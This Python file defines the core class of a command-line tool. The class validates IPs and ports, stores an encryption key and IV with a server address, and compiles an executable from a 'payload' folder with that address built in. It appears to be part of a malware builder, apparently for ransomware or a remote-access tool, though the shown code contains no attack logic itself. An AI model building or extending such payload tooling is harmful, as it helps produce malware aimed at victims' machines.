"""CLI core class"""
from models.ApiCalls import CallsHandler
import json
import re
from sys import platform
import os
import subprocess
import random
import string


class Core(CallsHandler):
    """Core class for CLI"""
    IsReady = False

    def GetUserInput(self, PromptText: str, ErrorText: str, InputLength: int, ExpectedInput: list, AllLower: bool) -> str:
        """
        Get user input as required.

        args:
            @PromptText (str): the text that will be printed before user can input.
            @ErrorText (str): the text that will be printed if the input didnt match what required.
            @InputLength (int): the length of the required input.
            @ExpectedInput (List[]): excepted inputs.
            @AllLower (bool): if the input should be converted to lowercase before validating.

        return:
            str: the required input.
        """
        InputData = ""
        while True:
            InputData = input(PromptText)

            if AllLower is True:
                InputData = InputData.lower()
            if InputLength != 0:
                if len(InputData) == InputLength:
                    break
                print(f"{ErrorText} {len(InputData)}.")
            elif ExpectedInput is not None:
                if InputData in ExpectedInput:
                    break
                print(ErrorText)
            else:
                break

        return InputData

    def save(self, FileName: str) -> None:
        """
        Save Encryption Key and IV to a given file
        args:
            @FileName (str): file name
        return
            None
        """
        data = {}

        if self.ApiUrl is not None:
            IpPort = self.ApiUrl[7:].split(":")
            data["ip"] = IpPort[0]
            data["port"] = int(IpPort[1])

        data["key"] = self.EncryptionKey.decode("utf-8")
        data["IV"] = self.IV.decode("utf-8")

        file = open(FileName, 'w')
        json.dump(data, file, indent=4)
        file.close()

    def load(self, FileName: str) -> None:
        """
        Load Encryption Key and IV from a given file
        args:
            @FileName (str): file name
        return
            None
        """
        file = open(FileName, 'r')
        data = json.loads(file.read())
        file.close()

        self.EncryptionKey = data["key"].encode("utf-8")
        self.IV = data["IV"].encode("utf-8")
        try:
            self.ip = data["ip"]
            self.port = data["port"]
        except KeyError:
            pass

    def IsValidIpv4(self, ip: str) -> bool:
        """
        Check if ip is valid or not.
        args:
            @ip (str): ip address.

        return:
            (bool); True if its valid, flase if not.
        """
        if re.match(pattern=r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$", string=ip):
            return True
        else:
            return False

    def IsValidPort(self, port: str) -> bool:
        """
        Check if port is valid or not.
        args:
            @port (str): port.

        return:
            (bool); True if its valid, flase if not.
        """
        try:
            port = int(port)
            if port > 65535:
                raise ValueError
            return True
        except ValueError:
            return False

    def BuildExe(self, ip, port):
        os.chdir("./payload")
        command = []
        if platform == "win32":
            command.append("build.bat")
            command.append(ip)
            command.append(port)
        else:
            command.append("make")

        subprocess.run(command)

        os.chdir("..")

    def RandomString(self, length: int) -> str:
        """Generate a random string of given length"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
